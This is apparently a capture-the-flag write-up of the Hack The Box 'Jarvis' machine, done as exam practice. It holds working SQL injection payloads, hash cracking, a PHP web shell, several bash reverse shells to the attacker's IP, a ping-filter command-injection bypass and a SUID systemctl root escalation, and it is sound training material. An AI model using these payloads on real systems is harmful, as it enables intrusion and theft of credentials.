---
permalink: /posts/HTB/Jarvis
title:  "HTB Jarvis"
author: Luc Kolen
description: "Jarvis is a medium Linux machine on HTB"
categories:
  - CTF
  - HTB
tags:
  - HTB-Medium
  - Linux
  - SQL injection
  - Hashcat
  - SUID
---
# 10.10.10.143 - Jarvis

This machine was done as OSCP preparation so without SQLMap.

- [10.10.10.143 - Jarvis](#101010143---jarvis)
  - [Open ports](#open-ports)
  - [SQL Injection](#sql-injection)
    - [Finding the SQL injection](#finding-the-sql-injection)
    - [Burp suite](#burp-suite)
      - [Original query](#original-query)
    - [Exploiting the SQL injection](#exploiting-the-sql-injection)
      - [SQL server information](#sql-server-information)
      - [Version](#version)
      - [Searching for tables & Columns](#searching-for-tables--columns)
      - [Exploiting the mysql.user table](#exploiting-the-mysqluser-table)
    - [Cracking the password hash](#cracking-the-password-hash)
  - [PHPMyAdmin](#phpmyadmin)
    - [Shell from PHPMyAdmin](#shell-from-phpmyadmin)
  - [Privilege escalation](#privilege-escalation)
    - [Linpeas](#linpeas)
    - [/var/www/Admin-Utilities/simpler.py](#varwwwadmin-utilitiessimplerpy)
    - [/bin/systemctl](#binsystemctl)
      - [GTFO bins](#gtfo-bins)
  - [TL;DR](#tldr)
  - [Bonus](#bonus)
    - [SQLMap](#sqlmap)
      - [Confirming the vulnerable parameter](#confirming-the-vulnerable-parameter)
      - [DBadmin password](#dbadmin-password)
      - [Shell](#shell)

## Open ports

```bash
luc@kali:~/Documents/Cyber-security/HTB/Jerry$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.143
```

![NMAP results](/assets/images/HTB-Jarvis/1.a%20NMAP%20results.png)

|Port|Service|
|---|---|
|22/tcp|OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)|
|80/tcp|Apache httpd 2.4.25 ((Debian))|
|64999/tcp|Apache httpd 2.4.25 ((Debian))|

## SQL Injection

The `room.php` page has the `cod` URL parameter, example: `http://10.10.10.143/room.php?cod=2`. This `cod` URL parameter might be vulnerable to SQL injection.

### Finding the SQL injection

A normal request will look like this: `/room.php?cod=2` and we get the expected room information.

![Normal information about room 2](/assets/images/HTB-Jarvis/1.b%20Normal%20information%20about%20room%202.png)

Changing this request to `/room.php?cod=2+union+select+1` will not show us any data because the SQL query result is invalid. This error isn't shown to the user browsing the website so we don't know what's wrong with the query.

![Invalid query](/assets/images/HTB-Jarvis/1.c%20Invalid%20query.png)

We keep adding fields to our payload and we find out that sending `/room.php?cod=2+union+select+1,2,3,4,5,6,7` will show us the data about room 2.

![Injected query shows data for room 2](/assets/images/HTB-Jarvis/1.d%20Injected%20query%20shows%20data%20for%20room%202.png)

This is interesting because we now know that our payload will need to return 7 fields, but we have the issue that only the first row of the queried data will be shown. We can fix this by using a non-existing room id instead of 2. The request will be `/room.php?cod=999+union+select+1,2,3,4,5,6,7`.

![Website shows our data](/assets/images/HTB-Jarvis/1.e%20Website%20shows%20our%20data.png)

### Burp suite

We can also do these requests in Burp suite, viewing the response can also show us the location of all our parameters and allow us to attempt to recreate the original query.

![SQL injection in burp suite](/assets/images/HTB-Jarvis/1.f%20SQL%20injection%20Burp%20Suite.png)

- ID(1) & Name(2): `<a href="/room.php?cod=1">2</a>`
- Price(3): `<span class="price-room">3</span>`
- Description(4): `<p>4</p>`
- Rating(5): `<span class="rate-star">5</span>`
- Image(6): `<a href="/images/6" class="room image-popup-link" style="background-image: url(/images/6);"></a>`
- Unknown(7): There was no 7 on the response page so we can't be sure what that value was in the original query.

#### Original query

The best guess at this time is `SELECT id, name, price, description, rating, image, ?? FROM room WHERE id = <cod>`

### Exploiting the SQL injection

#### SQL server information

It's unlikely that the value returned in field 4 (what we expect to be description) will be changed on the server before being shown so we'll use that to extract data from the SQL server.

#### Version

```http
GET /room.php?cod=999+union+select+1,2,3,@@version,5,6,7 HTTP/1.1

10.1.37-MariaDB-0+deb9u1
```

#### Searching for tables & Columns

First we need to find all tables and columns on the system.

```http
GET /room.php?cod=999+union+select+1,2,3,group_concat(concat(table_name,':',column_name)),5,6,7+from+information_schema.columns HTTP/1.1
```

The only non default columns are: `room:cod,room:name,room:price,room:descrip,room:star,room:image,room:mini` and these don't contain any information that will help us.

#### Exploiting the mysql.user table

We know that we're running version 10.1.37 and that version has the [mysql.user table](https://mariadb.com/kb/en/mysqluser-table/). This table contains the username and password hashes for the database users.

```http
GET /room.php?cod=999+union+select+1,2,3,group_concat(concat(user,':',password)),5,6,7+from+mysql.user HTTP/1.1

DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
```

### Cracking the password hash

```bash
luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ hashcat --example-hashes
...
MODE: 300
TYPE: MySQL4.1/MySQL5
HASH: fcf7c1b8749cf99d88e5f34271d636178fb5d130
PASS: hashcat
...
luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ echo 'DBadmin:2D2B7A5E4E637B8FBA1D17F40318F277D29964D0' > hashes
luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ hashcat -m 300 --username hashes /usr/share/seclists/Passwords/darkweb2017-top10000.txt
...
2d2b7a5e4e637b8fba1d17f40318f277d29964d0:imissyou
...
```

We've found the password `imissyou`

## PHPMyAdmin

We've a password, but nowhere to use it (DBadmin:imissyou didn't work as SSH credentials). Running GOBuster does show an interesting result.

```bash
luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ gobuster dir -u http://10.10.10.143:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -z -k -l -x "txt,html,php,asp,aspx,jsp"
...
/phpmyadmin (Status: 301) [Size: 317]
...
```

![Successful PHPMyAdmin login](/assets/images/HTB-Jarvis/1.g%20Successful%20PHPMyAdmin%20login.png)

### Shell from PHPMyAdmin

PHPMyAdmin allows us to run SQL queries without having to use our SQL injection.

![Create cmd.php from PHPMyAdmin](/assets/images/HTB-Jarvis/1.h%20Create%20cmd.php%20from%20PHPMyAdmin.png)

```sql
SELECT "<?php system($_GET['cmd']);?>" INTO outfile '/var/www/html/cmd.php'
```

```http
GET /cmd.php?cmd=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.16/443+0>%261" HTTP/1.1
```

```bash
luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ sudo nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.143.
Ncat: Connection from 10.10.10.143:37606.
bash: cannot set terminal process group (584): Inappropriate ioctl for device
bash: no job control in this shell
www-data@jarvis:/var/www/html$
```

## Privilege escalation

### Linpeas

```bash
luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ cp /opt/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh .
luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ python3 -m http.server
```

```bash
www-data@jarvis:/tmp$ wget http://10.10.14.16:8000/linpeas.sh
www-data@jarvis:/tmp$ chmod +x linpeas.sh
www-data@jarvis:/tmp$ ./linpeas.sh | tee linpeas.result
...
User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
...
[+] SUID - Check easy privesc, exploits and write perms
/bin/systemctl
...
www-data@jarvis:/tmp$ ls -lsa /bin/systemctl
172 -rwsr-x--- 1 root pepper 174520 Feb 17  2019 /bin/systemctl
```

We can't run /bin/systemctl as www-data, but we can run /var/www/Admin-Utilities/simpler.py as pepper so that will be the next step.

### /var/www/Admin-Utilities/simpler.py

The most interesting function in `simpler.py` is `exec_ping()` because it allows us to execute commands. We do however need to find a way to bypass the check for forbidden characters.

```python
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
```

`$`, `(` and `)` are allowed so we can use that to get code execution. We can test this by using `$(whoami)`.

```bash
www-data@jarvis:/var/www/Admin-Utilities$ sudo -u pepper /var/www/Admin-Utilities/simpler.py python3 simpler.py -p
***********************************************
     _                 _
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/
                                @ironhackers.es

***********************************************

Enter an IP: $(whoami)
ping: pepper: Temporary failure in name resolution
```

We can see that it tried to use `pepper` as the target to send ping to. This confirms that we're running commands as pepper. `/` isn't banned so we can send `$(/bin/bash)` as the IP to ping. This will drop us into bash as pepper and this allows us to connect to our listener on port 444.

```bash
www-data@jarvis:/var/www/Admin-Utilities$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/
                                @ironhackers.es

***********************************************

Enter an IP: $(/bin/bash)
pepper@jarvis:/var/www/Admin-Utilities$ bash -i >& /dev/tcp/10.10.14.16/444 0>&1
```

```bash
luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ sudo nc -lnvp 444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::444
Ncat: Listening on 0.0.0.0:444
Ncat: Connection from 10.10.10.143.
Ncat: Connection from 10.10.10.143:43350.
pepper@jarvis:/var/www/Admin-Utilities$ cd /home/pepper/
pepper@jarvis:~$ cat user.txt
2afa36c4************************
```

### /bin/systemctl

We noticed earlier that /bin/systemctl is a SUID binary. We couldn't execute it as www-data, but we can execute it as pepper.

```bash
pepper@jarvis:~$ ls /bin/systemctl -lsa
172 -rwsr-x--- 1 root pepper 174520 Feb 17  2019 /bin/systemctl
```

#### GTFO bins

[GTFO Bins Systemctl](https://gtfobins.github.io/gtfobins/systemctl/#suid) shows us that this application is exploitable to get root access on a system. We'll have our service connect to our listener on port 445.

```bash
pepper@jarvis:~$ nano exploit.service
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.16/445 0>&1'

[Install]
WantedBy=multi-user.target
pepper@jarvis:~$ /bin/systemctl enable /home/pepper/exploit.service
pepper@jarvis:~$ /bin/systemctl start exploit
```

```bash
luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ sudo nc -lnvp 445
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::445
Ncat: Listening on 0.0.0.0:445
Ncat: Connection from 10.10.10.143.
Ncat: Connection from 10.10.10.143:47722.
bash: cannot set terminal process group (49907): Inappropriate ioctl for device
bash: no job control in this shell
root@jarvis:/# whoami
root
root@jarvis:/# cd /root
cat root.txt
d41d8cd9************************
```

## TL;DR

- The page room.php is vulnerable to SQL injection
- Crack password extracted via SQL injection to get into PHPMyAdmin
- Start a shell from PHPMyAdmin
- Bad character filter in Python application allows www-data to execute commands as pepper
- SUID /bin/cystemctl from pepper to root

## Bonus

### SQLMap

SQLMap wasn't used during the initial exploitation of this box to keep it limited to what's allowed to use during the OSCP exam.

#### Confirming the vulnerable parameter

```bash
luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ sqlmap -u http://10.10.10.143/room.php?cod=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
...
Parameter: cod (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cod=1 AND 6124=6124

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: cod=1 AND (SELECT 1284 FROM (SELECT(SLEEP(5)))MYih)

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: cod=-8129 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x717a6a6b71,0x65767061654c4279516a42695542794b655679774a44634f776948735747644f6a41546f43624d6c,0x7178787a71),NULL,NULL-- -
...
```

#### DBadmin password

```bash
luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ sqlmap -u http://10.10.10.143/room.php?cod=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --passwords
...
[*] DBadmin [1]:
    password hash: *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
    clear-text password: imissyou
...
```

#### Shell

```bash
luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ sqlmap -u http://10.10.10.143/room.php?cod=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --os-shell
...
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output: 'www-data'
```
